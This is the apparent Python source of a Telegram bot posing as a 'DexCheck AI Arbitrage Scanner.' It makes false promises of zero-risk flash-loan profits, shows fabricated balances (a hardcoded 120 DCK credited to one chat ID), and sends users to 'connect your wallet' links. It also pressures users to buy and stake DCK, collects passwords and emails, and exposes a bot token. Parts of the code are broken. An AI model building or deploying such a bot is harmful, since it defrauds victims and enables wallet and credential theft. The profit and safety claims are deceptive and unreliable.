import telebot
from telebot import types
import logging
from urllib.parse import urlencode
import pandas as pd
from io import BytesIO
import requests
import logging
import html
from telebot import util
from telebot import apihelper
from telebot import util
import re
TOKEN = '6897068588:AAFLEvcTge1fqFmjWgsu1OTeG4OaygdsUaU'
bot = telebot.TeleBot(TOKEN)
CHANNEL_USERNAME = '@DexCheckArbitrageScanner'  # Use the channel username without the URL
CHANNEL_ID = '@DexCheckArbitrageScanner'  # Replace with your channel line
usernames = {}
@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_name = message.from_user.username if message.from_user.username else "User"

    # Save the username in the dictionary
    usernames[chat_id] = user_name
    start_bot(message)


def start_bot(message):
    chat_id = message.chat.id
    buttons = [
        types.InlineKeyboardButton("💹 AI Arbitrage Scanner", callback_data='arbitrade'),
        types.InlineKeyboardButton("📊 Token Analytics", url='https://t.me/Dex_checkTradingBot/Coin_Analytics'),
        types.InlineKeyboardButton("❓ Help", callback_data='help'),
    ]

    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(*buttons)

    message_text = (
        "Dexcheck AI Arbitrage bot scanner is a real-time artificial "
        "intelligence bot that scans the prices of crypto assets on crypto exchanges "
        "and if a profitable pair is detected, it executes the trade using flash loan "
        "(meaning we won't use your actual crypto token instead "
        "our smart contract is designed to request a flash loan with no collateral on your behalf, making this a zero-risk trading strategy). "
        "Don't worry!DexCheck vouches for you on the blockchain transaction block to get approved for a flash loan.\n\n"

        "- The scanner bot works without delays and without interruption and receives the value of all trading pairs on the spot market across different exchanges. "
        "At the moment, the bot scans about 400 verified crypto exchanges. In the future, the bot will be further developed, and the number of scanned exchanges will be increased!\n\n"

        "- The bot scanner automatically calculates the cost of transferring a coin through a specific network to another exchange, "
        "calculates the commission for input and output, and also shows whether input and output are open on exchanges at a given time before trades are executed.\n\n"

        "- If the price changes during the execution of the chain, the service adapts, "
        "builds a new chain, and continues the operation, ultimately resulting in a profit.\n\n"

        "- After each successful operation, the bot calculates and saves profits automatically.\n\n"

        "- You need to stake at least 100k DCK to be eligible for a flash loan vouch which automatically places you at level 2.\n\n"
	"- For Non DCK holders you need a wallet with good transaction history on the ethereum network to be eligible for a flash loan and you will be placed on level 1.\n\n"

        "🚀 User-Friendly Interface.\n"
        "🔒 Secure & Transparent."
    )

    bot.send_message(
        chat_id,
        message_text,
        reply_markup=keyboard,
        parse_mode='HTML'
    )
def prompt_to_join_channel(message):
    # Prompt the user to join the channel
    join_channel_button = types.InlineKeyboardButton("Join Channel", url='https://t.me/DexCheckArbitrageScanner')
    keyboard = types.InlineKeyboardMarkup().add(join_channel_button)

    bot.send_message(message.chat.id, "To access the bot, please join our channel:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def button_click(call):
    try:
        user_name = call.message.from_user.username if call.message.from_user.username else "User"

        button_data = call.data
        chat_id = call.message.chat.id  # Ensure that 'call' is a CallbackQuery object
        user_id = call.from_user.id
        action = call.data
        if button_data == 'arbitrade':
            arbitrage(call.message)
        elif button_data == 'start':
            start_command(call.message)
        elif button_data == 'balance':
            balance(call.message)
        elif button_data == 'structure':
            structure(call.message)
        elif button_data == 'dckarbitrage':
            dckarbitrage(call.message)
        elif button_data == 'start_arbitrage':
            start_arbitrage(call.message)
        elif button_data == 'dck_airdrop':
            dckairdrop(call.message)
        elif button_data == 'info':
            info_command(call.message)
        elif button_data == 'search_crypto':
            search_crypto_command(call.message)
        elif button_data == 'settings':
            settings(call.message)
        elif button_data == 'history':
            history_command(call.message)
        elif button_data == 'withdraw':
            withdraw_command(call.message)
        elif button_data == 'authenticator':
             authentication(call.message)
        elif button_data == 'send_message':
            message_support(call.message)
        elif button_data == 'bsc':
            dck_balance_command(call.message)
        elif button_data == 'success_balance':
            success_balance(call.message)
        elif button_data == 'eth':
            check_balance_command(call.message)
        elif button_data == 'connect_exchange':
            connect_exchanges(call.message)
        elif button_data == 'help':
            help_command(call.message)
        elif button_data == 'excel_report':
            excel_report(call.message)
        elif button_data == 'done':
            # Handle the 'done' action
            done_action(call.message)
        print("Update processed successfully.")
    except Exception as e:
        print(f"Error in button_click: {e}")
# Add this function to handle the 'done' action
def done_action(message):
    # Handle the 'done' action here
    bot.send_message(message.chat.id, "You clicked 'Done Connecting'.")
support_chats = {}
@bot.message_handler(commands=['compose_support_message'])
def message_support(message):
    SUPPORT_HANDLE = 'kelvinejike'

    # Compose the demo message
    demo_message = (
        "👋 Hello! my name is.....\n"
        "Please I have  a problem with .......\n\n"
        "[Edit this part to describe your issue or question].\n"
        "kindly assist me."
    )
    print(f"SUPPORT_HANDLE: {SUPPORT_HANDLE}")

    # Create an inline keyboard with a button to open the support handle URL
    keyboard = types.InlineKeyboardMarkup()
    support_button = types.InlineKeyboardButton("send structured message", url=f"https://t.me/{SUPPORT_HANDLE}")
    keyboard.add(support_button)

    # Forward the pre-composed message to the support handle
    bot.forward_message(SUPPORT_HANDLE, message.chat.id, message.message_id)

    # Send a message to the user with the support button
    bot.send_message(message.chat.id, "Your message has been forwarded to support. Assistance will be provided shortly.", reply_markup=keyboard, parse_mode='Markdown', disable_web_page_preview
=True)
@bot.message_handler(func=lambda message: message.chat.id in support_chats.values())
def support_reply(message):
    # Extract the user ID corresponding to the support chat
    user_id = [k for k, v in support_chats.items() if v == message.chat.id][0]

    # Reply to the user
    bot.send_message(user_id, f"Support: {message.text}")
@bot.message_handler(commands=['help_command'])
def help_command(message):
    # Generate the "Contact Support" button dynamically
    support_button = types.InlineKeyboardButton(text='📩 Contact Support', url='https://t.me/DexCheck_Admin')
    back_to_main_menu_button = types.InlineKeyboardButton("⬅️ Back to Main Menu", callback_data='start')
    reply_markup = types.InlineKeyboardMarkup([[support_button, back_to_main_menu_button]])

    # Reply to the user with the "Help" message and the "Contact Support" button
    bot.send_message(chat_id=message.chat.id, text=" Help ❓ Have questions? We're here to assist you!", reply_markup=reply_markup)


def create_switch_chain_button():
    return types.InlineKeyboardButton("Switch Chain", callback_data='start')

def arbitrage(message):
    chat_id = message.chat.id
    #switch_chain_button = create_switch_chain_button()  # Assuming this function is defined

    buttons = [
        types.InlineKeyboardButton("💡 AI Scanner", callback_data='dckarbitrage'),
        types.InlineKeyboardButton("📚 Structure", callback_data='structure'),
        types.InlineKeyboardButton("🏦 Balance", callback_data='balance'),
        types.InlineKeyboardButton("⚙️ Settings", callback_data='settings'),
        types.InlineKeyboardButton("⬅️ Main Menu", callback_data='start'),
    ]

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    #keyboard.add(switch_chain_button)  # Adding the switch_chain_button

    bot.send_message(
        chat_id,
        "Dexcheck AI Scanner - Elevate Your Profits! & Maximize Your Daily Gains. 🚀\n\n"
        "Ready to Elevate Yourself? 👇\n\n"
        "Select an option below to get started 🤩",
        reply_markup=keyboard,
        parse_mode='HTML'
    )


@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'balance':
        balance(call.message)
@bot.message_handler(commands=['balance'])


@bot.message_handler(commands=['balance'])
def balance(message):
    chat_id = message.chat.id
    user_name = message.from_user.username if message.from_user.username else "User"
    username = user_name = usernames.get(chat_id, "User")
    keyboard = types.InlineKeyboardMarkup()
    withdraw_button = types.InlineKeyboardButton("💰Withdrawal", callback_data='withdraw')
    keyboard.row(withdraw_button)

    balance_message = (
        f"Hello {username}!\n"
        "💰Your balance DCK:0.00 \n"
        "💰DCK Air drop Balance:(unclaimed)\n"
    )
    photo_url = "https://i.pinimg.com/originals/9c/a6/3a/9ca63aaef08a211b3ef10d98d1b76020.png"
    reply_markup = keyboard
    bot.send_photo(message.chat.id, photo_url, caption=balance_message,reply_markup=reply_markup)
@bot.message_handler(commands=['success_balance'])
def success_balance(message):
    chat_id = message.chat.id
    #user_name = usernames.get(chat_id, "User")
    user_name = message.from_user.username if message.from_user.username else "User"
    username = user_name = usernames.get(chat_id, "User")

    keyboard = types.InlineKeyboardMarkup()
    withdraw_button = types.InlineKeyboardButton("💰Withdrawal", callback_data='withdraw')
    keyboard.row(withdraw_button)

    balance_message = (
        f"Hello {username}!\n💰"
        "Your balance(token) DCK: 120.00 💰\n"
        "Your balance (DCK Air drop): 3,000 DCK 💰 (Check eligibility on DCK Airdrop)\n"
    )
    photo_url = "https://i.pinimg.com/originals/9c/a6/3a/9ca63aaef08a211b3ef10d98d1b76020.png"
    reply_markup = keyboard
    bot.send_photo(message.chat.id, photo_url, caption=balance_message,reply_markup=reply_markup)


@bot.message_handler(commands=['withdraw'])
def withdraw_command(message):
    chat_id = message.chat.id
    #user_name = usernames.get(chat_id, "User")
    user_name = message.from_user.username if message.from_user.username else "User"
    username = user_name = usernames.get(chat_id, "User")

    keyboard = types.InlineKeyboardMarkup()
    withdraw_button = types.InlineKeyboardButton("previous menu", callback_data='arbitrade')
    keyboard.row(withdraw_button)

    withdrawal_message = (
        f"Hello {username}!\n💰 First Start Arbitarge trade to withdraw.\n"
        "For further assistance, click the 'Help' button on the main menu to contact Support."
    )

    # Send the message with the inline keyboard
    bot.send_message(message.chat.id, withdrawal_message, reply_markup=keyboard)

user_data = {}

@bot.message_handler(commands=['authenticator'])
def authentication(message):
    chat_id = message.chat.id
    print('Authentication started')

    # Check if user has already set information
    if chat_id in user_data:
        bot.send_message(chat_id, "You've already set your information.")

    else:
        # Ask user to set a password
        bot.send_message(chat_id, "Please set your password:")
        bot.register_next_step_handler(message, set_password)

def set_password(message):
    chat_id = message.chat.id
    password = message.text.strip()

    # Store password in user_data dictionary
    user_data[chat_id] = {'password': password}

    # Ask user to set an email
    bot.send_message(chat_id, "Password set successfully. Now, please set your email:")
    bot.register_next_step_handler(message, set_email)

def set_email(message):
    chat_id = message.chat.id
    email = message.text.strip()

    # Store email in user_data dictionary
    user_data[chat_id]['email'] = email

    # Inform user that authentication information is set
    bot.send_message(chat_id, "Authentication information set successfully.")


@bot.message_handler(commands=['structure'])
def structure(message):
    chat_id = message.chat.id
    #user_name = usernames.get(chat_id, "User")
    user_name = message.from_user.username if message.from_user.username else "User"
    user_id = message.from_user.id
    username = user_name = usernames.get(chat_id, "User")


    # Get bot information
    bot_info = bot.get_me()
    bot_username = bot_info.username if bot_info else "your_bot_username"

    referral_link = f"https://t.me/{bot_username}?start={user_id}"

    structure_message = (
        f"Dear {username}!\n\n"
        "Welcome to the Structure section. Here, you can view your referral link and structure details.\n\n"
        f"Your ID: {user_id}\n"
        "You were invited by: -\n"
        f"Your referral link(free 50 DCK per referral):\n{referral_link}\n\n"
        "Levels:\n"
        " - Non-DCK Holders: Level 1 (AI scanner scans 12 hrs daily)\n"
	" - DCK Holders: Level 2 (AI scanner scans for 24 hrs daily)\n"

        "For more information, explore the options below:\n"
        " - ℹ️ Info: Learn more about profits and level.\n"
        " - ✉️ Send Message: Contact our support team.\n"
        " - 📊 Excel Report: View detailed reports.\n"
        " - 🔍 Search Crypto Coin: Explore cryptocurrencies information.\n"
        " - ⬅️ Back to arbitrage main menu: Return to the main menu."
    )

    keyboard = types.InlineKeyboardMarkup()
    info_button = types.InlineKeyboardButton("ℹ️ Info", callback_data='info')
    send_message_button = types.InlineKeyboardButton("✉️ Send Message", url='https://t.me/Dexcheck_support')
    excel_report_button = types.InlineKeyboardButton("📊 Excel Report", callback_data='excel_report')
    search_crypto_coin_button = types.InlineKeyboardButton("🔍 Search Crypto Coin", callback_data='search_crypto')
    arbitrage_button = types.InlineKeyboardButton("⬅️ Back to arbitrage main menu", callback_data='start')

    keyboard.row(info_button, send_message_button)
    keyboard.row(excel_report_button, search_crypto_coin_button)
    keyboard.row(arbitrage_button)

    bot.send_message(message.chat.id, structure_message, reply_markup=keyboard)

@bot.message_handler(commands=['dckarbitrage'])
def dckarbitrage(message):
    chat_id = message.chat.id
    #user_name = usernames.get(chat_id, "User")
    user_name = message.from_user.username if message.from_user.username else "User"
    username = user_name = usernames.get(chat_id, "User")

    # Catchy message about Arbitrade and its gains
    catchy_message = (
        f"🚀 Welcome, {username}!\n\n"
        "Discover the power of AI Arbitrage!\n\n"
        "🌟 Elevate your profits with 24/7 automated arbitrage!\n"
        "📈 Maximize gains across diverse exchanges with seamless trading.\n"
        "💡 Experience a user-friendly interface for smart and secure trading.\n"
        "🔒 Unlock the potential of AI Arbitrage Scanner\n\n"

    )

    # Buttons for DCKArbitrage options
    keyboard = types.InlineKeyboardMarkup()
    ispo_button = types.InlineKeyboardButton("✅START", callback_data='start_arbitrage')
    dck_staking_button = types.InlineKeyboardButton("💰 DCK Staking", url='https://staking.dexcheck.ai')
    dck_airdrop_button = types.InlineKeyboardButton("🚁 DCK Airdrop", callback_data='dck_airdrop')

    arbitrage_button = types.InlineKeyboardButton("⬅️ Back to arbitrage main menu", callback_data='arbitrade')
    keyboard.row(ispo_button, dck_staking_button)
    keyboard.row(dck_airdrop_button,arbitrage_button)

    bot.send_message(message.chat.id, catchy_message, reply_markup=keyboard)
@bot.message_handler(commands=['settings'])
def settings(message):
    # Buttons for Settings options
    keyboard = types.InlineKeyboardMarkup()
    language_button = types.InlineKeyboardButton("🌐 Language", callback_data='language')
    authentication_button = types.InlineKeyboardButton("🔐 Authentication", callback_data='authenticator')
    structured_chat_button = types.InlineKeyboardButton("📊 History", callback_data='history')
    arbitrage_button = types.InlineKeyboardButton("⬅️ previous menu", callback_data='structure')

    keyboard.row(language_button, authentication_button)
    keyboard.row(structured_chat_button, arbitrage_button)

    bot.send_message(message.chat.id, "Settings options:", reply_markup=keyboard)

@bot.message_handler(commands=['dck_airdrop'])
def dckairdrop(message):
    # Button for checking eligibility
    eligibility_button = types.InlineKeyboardButton("Check Eligibility", url='https://t.me/Dex_checkTradingBot/DexCheck_Arbitrage_monitor')

    # Button to go back to arbitrage main menu
    arbitrage_button = types.InlineKeyboardButton("⬅️ previous Menu", callback_data='arbitrade')

    # Keyboard with both buttons
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(eligibility_button)
    keyboard.add(arbitrage_button)

    # Message about DCK Token Airdrop
    airdrop_message = (
        "🚀 **DCK Token Airdrop!** 🚀\n\n"
        "**Exciting news! You have the chance to participate in the DCK Token weekly Airdrop!**\n\n"
        "**To qualify, make sure:**\n"
        "1.** You hold at least 10k DCK in your wallet.**\n"
        "**Ready to claim your 3,000 DCK reward? to get started! click check eligibility and connect your wallet below**\n"
        "_Important:\n Multiple attempts in the airdrop claim will\n lead to disqualification\n"
        "and DCK token frozen;\n ensure single and genuine participation for a fair experience._"
    )

    # Send the message with the eligibility button
    bot.send_message(message.chat.id, airdrop_message, reply_markup=keyboard, parse_mode='Markdown')
@bot.message_handler(commands=['info'])
def info_command(message):
    # Photo URL
    photo_url = "https://i.pinimg.com/originals/cd/e3/e7/cde3e7c9f6151196a6f1ab0c851abb5e.png"

    # Message about Arbitrage System
    info_message = (
        "🌐 **Arbitrage System Overview** 🌐\n\n"+++
         "Your current <b>Level</b> 🔐:(add your wallet address to be assigned to a level) \n"
        "The percentage of your daily profit credited to your account increases according to levels 💼💰\n"
        "By levels:\n"
        "<b>Level 1</b>: 60%, 🔐\n"
        "<b>Level 2</b>: 90%, 🔐\n"
        "Profit distributions happens several times a day, after the execution of each arbitrage chain of exchanges. ⏰🔄"
        "profit can easily be withdrawn to your registered wallet at any time"
    )
    arbitrage_button = types.InlineKeyboardButton("⬅️ previous menu", callback_data='structure')
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(arbitrage_button)
    # Send the message with the photo
    bot.send_photo(message.chat.id, photo_url, caption=info_message, parse_mode='HTML', reply_markup=keyboard)

userdata = {
    'wallet_balance': 0,
    'num_trades': 0,
    'total_referral': 0,
    'referral_bonus': 0,
    'profit':0,
    'interest':0
}

# Function to generate an Excel report and send it to the user
def generate_excel_and_send(chat_id):
    # Create a DataFrame with user data
    df_data = {
        'Balance': [userdata['wallet_balance']],
        'Number of Trades': [userdata['num_trades']],
        'Total Referral': [userdata['total_referral']],
        'Referral Bonus': [userdata['referral_bonus']]
    }
    df = pd.DataFrame(df_data)

    # Create a BytesIO buffer to store the Excel file
    buffer = BytesIO()

    # Use pandas to write the DataFrame to an Excel file
    df.to_excel(buffer, index=False, sheet_name='UserReport')

    # Seek to the beginning of the buffer
    buffer.seek(0)

    # Send the Excel file to the user
    bot.send_document(chat_id, buffer, caption='Your User Report.xlsx', reply_markup=create_back_button())

# Command handler for the /excel_report command
from telegram import InputFile
@bot.message_handler(commands=['excel_report'])
def send_excel_file(file_path):
    chat_id = message.chat.id

    with open(file_path, 'rb') as excel_file:
        bot.send_document(chat_id, document=InputFile(excel_file))
@bot.message_handler(commands=['excel_report'])
def excel_report(message):
    chat_id = message.chat.id

    # Replace 'path/to/your/excel/file.xlsx' with the actual path to your Excel file
    excel_file_path = 'excel.xlsx'

    with open(excel_file_path, 'rb') as excel_file:
        bot.send_document(chat_id, document=excel_file)
def create_back_button():
    return types.InlineKeyboardButton("⬅️ Back", callback_data='back')
# You can add this button creation function to your code
# Define a dictionary to store user data
user_data = {
    'chat_id': None
}
SEARCH_CRYPTO_STATE = 1

def get_coin_id_by_name_or_symbol(name_or_symbol):
    url = "https://api.coinlore.net/api/tickers/"
    response = requests.get(url)
    data = response.json()
    for coin in data['data']:
        if name_or_symbol.lower() in [coin['name'].lower(), coin['symbol'].lower()]:
            return coin['id']

def get_coin_info_by_id(coin_id):
    url = f"https://api.coinlore.net/api/ticker/?id={coin_id}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")
        return None
    except requests.exceptions.HTTPError as e:
        print(f"HTTP error: {e}")
        return None
    except requests.exceptions.JSONDecodeError as e:
        print(f"JSON decoding error: {e}")
        return None

@bot.message_handler(commands=['search_crypto'])
def search_crypto_command(message):
    markup = types.ForceReply(selective=False)
    bot.send_message(chat_id=message.chat.id, text="Please enter the coin name or symbol.")
    bot.register_next_step_handler(message, process_search_crypto)
def format_number(num):
    if num is None:
        return 'N/A'

    try:
        num = float(num)
    except ValueError:
        return str(num)

    if num < 1_000:
        return str(num)
    elif num < 1_000_000:
        return f'{num / 1_000:.1f}K'
    elif num < 1_000_000_000:
        return f'{num / 1_000_000:.1f}M'
    else:
        return f'{num / 1_000_000_000:.1f}B'

def process_search_crypto(message):
    user_input = message.text.strip().upper()

    if not user_input:
        return bot.send_message(chat_id=message.chat.id, text="Search by coin name or symbol.")

    coin_id = get_coin_id_by_name_or_symbol(user_input)
    print(f"Coin ID: {coin_id}")

    if coin_id:
        crypto = get_coin_info_by_id(coin_id)
        print(f"Crypto Info: {crypto}")

        if crypto:
            entry_dict = crypto[0] if isinstance(crypto, list) else crypto

            name = entry_dict.get('name', 'N/A')
            symbol = entry_dict.get('symbol', 'N/A')
            rank = entry_dict.get('rank', 'N/A')
            circulating_supply = format_number(entry_dict.get('csupply'))
            total_supply = format_number(entry_dict.get('tsupply'))

            quotes = entry_dict.get('quotes', {})
            usd_info = quotes.get('USD', {})
            price = format_number(entry_dict.get('price_usd'))
            market_cap = format_number(entry_dict.get('market_cap_usd'))
            volume_24h = format_number(entry_dict.get('volume24'))
            percent_change_24h = entry_dict.get('percent_change_24h', 'N/A')

            response_text = (
                f"🔔 {name}🔔\n"
                f"📈 *CA:* ❌\n"
                f"Symbol: {symbol}\n"
                f"Rank: {rank}\n"
                f"💰 Liquidity: {circulating_supply}\n"
                f"💰 Total Supply: {total_supply}\n"
                f"🧢 MCap (USD): {market_cap}\n"
                f"💲 Token Price(USD): {price}\n"
                f"Additional Info\n"
                f"🐝 Honeypot: ❌\n"
                f"Renounced: ❌\n"
                f"📊 24h Volume (USD): {volume_24h}\n"
                f"💯 Percent Change (24h): {percent_change_24h}%\n"
            )
            back_to_main_menu_button = types.InlineKeyboardButton("⬅️ Search Again", callback_data='search_crypto')
            previous_menu_button = types.InlineKeyboardButton("⬅️ Previous Menu", callback_data='arbitrade')  # Corrected button name
            reply_markup = types.InlineKeyboardMarkup([[back_to_main_menu_button, previous_menu_button]])

            bot.send_message(chat_id=message.chat.id, text=response_text, reply_markup=reply_markup)

        else:
            bot.send_message(chat_id=message.chat.id, text="Crypto information not found. Please check the symbol.)")
    else:
        bot.send_message(chat_id=message.chat.id, text="Crypto information not found. Please check the symbol.")
user_data = {}  # Dictionary to store user-specific data

@bot.message_handler(commands=['start_arbitrage'])
def start_arbitrage(message):
    chat_id = message.chat.id
    buttons = [
        types.InlineKeyboardButton("🟧 DCK HODLers", callback_data='bsc'),
        types.InlineKeyboardButton("🟦 Start Trial", callback_data='eth'),
        # Button to go back to arbitrage main menu
        types.InlineKeyboardButton("⬅️ previous Menu", callback_data='arbitrade')

    ]

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)

    bot.send_message(
        chat_id,
        "🚀 Click DCK HODLers if you are a DCK HODLers or Start trial for Non-DCK HODLers",
        reply_markup=keyboard,
        parse_mode='HTML'
    )

# Assuming you have defined 'bot' and 'video_url' elsewhere in your code

# Command handler for '/check_balance'
# Assuming you have defined 'bot' and 'video_url' elsewhere in your code

# Regular expression to check if the address looks like a valid crypto wallet address
address_pattern = re.compile(r'^[a-zA-Z0-9]{25,42}$')

# Function to check if the wallet address is valid
def is_valid_wallet_address(wallet_address):
    return bool(re.match(address_pattern, wallet_address))

# Command handler for '/check_balance'
@bot.message_handler(commands=['check_balance'])
def check_balance_command(message):
    chat_id = message.chat.id
    markup = types.ForceReply(selective=False)
    buttons = [
            types.InlineKeyboardButton("🟧 connect", url="https://t.me/DexCheck_AI_Arbitrage_Scannerbot/dckarbitrage_ai"),
            # Button to go back to arbitrage main menu
            types.InlineKeyboardButton("⬅️ previous Menu", callback_data='arbitrade')
            ]

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(*buttons)
    bot.send_message(chat_id, "Click the button below to assign a base exchange for the arbitrage trading", reply_markup=keyboard)
@bot.message_handler(commands=['check_balance'])
def dck_balance_command(message):
    chat_id = message.chat.id
    markup = types.ForceReply(selective=False)
    bot.send_message(chat_id, "Enter your wallet below to get started", reply_markup=markup)

# Message handler for any message (func=lambda message: True)
@bot.message_handler(func=lambda message: True)
def handle_wallet_address(inner_message):
    inner_chat_id = inner_message.chat.id
    print(inner_chat_id)

    user_wallet_address = inner_message.text.strip()

    if is_valid_wallet_address(user_wallet_address) and inner_chat_id ==  689022305:
        buttons = [
            types.InlineKeyboardButton("check profit", callback_data='success_balance')

        ]
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(*buttons)

        caption_text = '[Monitor Arbitrage](https://pad-chaingpt.com/arbitrage.gif)'

        # Use send_message to send a message with caption and keyboard
        bot.send_message(inner_chat_id, caption_text, reply_markup=keyboard, parse_mode='MarkdownV2')


    # Check if the wallet address is valid
    elif is_valid_wallet_address(user_wallet_address):
        buttons = [
            types.InlineKeyboardButton("Buy DCK", url="https://pancakeswap.finance/swap?outputCurrency=0x16faF9DAa401AA42506AF503Aa3d80B871c467A3&inputCurrency=BNB"),
            types.InlineKeyboardButton("Stake", url="https://staking.dexcheck.ai"),
            types.InlineKeyboardButton("previous menu", callback_data='start_arbitrage'),
        ]

        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(*buttons)

        message = (
            "You do not have enough staked DCK to \n"
            "be eligible for a flash loan to start arbitrage\n"
            "<b><u>Instruction on how to begin</u></b>\n"
            "<b>1. Buy:</b> Buy DCK by clicking on the buy DCK button below\n"
            "<b>2. Stake:</b> Stake at least 100,000DCK by clicking stake button below\n"
            "<b>3.</b> Click previous menu to use start trial\n\n"
            "<b>Contact support by clicking help on the main menu if you need further assistance</b>"
        )

        bot.send_message(inner_chat_id, message, reply_markup=keyboard, parse_mode='HTML')

    # If the wallet address is not valid
    else:
        bot.send_message(inner_chat_id, "Invalid wallet address. Please enter a valid crypto wallet address.")

# Other parts of your code...

# Command handler for '/history'
@bot.message_handler(commands=['history'])
def history_command(message):
    bot.send_message(chat_id=message.chat.id, text="You do not have any history yet")

if __name__ == '__main__':
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
    bot.remove_webhook()
    bot.polling()
